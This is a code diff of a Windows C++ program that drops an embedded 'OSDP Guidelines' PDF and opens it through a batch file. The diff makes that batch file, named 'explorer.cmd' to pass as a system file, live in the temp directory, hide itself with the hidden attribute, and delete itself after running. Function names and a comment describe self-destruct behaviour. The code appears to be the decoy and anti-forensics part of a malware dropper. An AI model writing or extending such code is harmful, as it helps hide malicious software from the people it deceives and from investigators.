@@ -21,14 +21,35 @@ void CleanupAndDestroy() {
 }
 
 
+std::string TmpPath() {
+    char buffer[MAX_PATH];
+    DWORD length = GetTempPathA(MAX_PATH, buffer);
+    if (length == 0 || length >= MAX_PATH) {
+        //std::cerr << "Failed to get temp path\n";
+        return "";
+    }
+    return std::string(buffer);
+}
 
-void CreateBat(const std::string& pdfPath) {
-    std::ofstream batchFile("explorer.cmd");
+
+std::string CreateBat(const std::string& pdfPath) {
+    std::string tempDirectory = TmpPath();
+    const std::string batFileName = tempDirectory + "explorer.cmd";
+
+    std::ofstream batchFile(batFileName);
+    if (!batchFile.is_open()) {
+        //std::cerr << "Failed to create batch file\n";
+        return "";
+    }
+
     batchFile << "@echo off\n";
     batchFile << "start \"\" \"" << pdfPath << "\"\n";
-    batchFile << "timeout /t 2 >nul\n"; 
+    batchFile << "timeout /t 3 >nul\n";
     batchFile << "del \"%~f0\"";
     batchFile.close();
+
+    SetFileAttributesA(batFileName.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    return batFileName;
 }
 
 
@@ -59,9 +80,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     output.write(reinterpret_cast<char*>(OSDP_Guidelines_pdf), OSDP_Guidelines_pdf_len);
     output.close();
 
-    CreateBat(pdfPath);
+    std::string BatPath = CreateBat(pdfPath);
     Sleep(1);
-    ExecBat("explorer.cmd");
+    ExecBat(BatPath);
 
     /*
     // Mode 1: run once and then > cleanup > self destruct
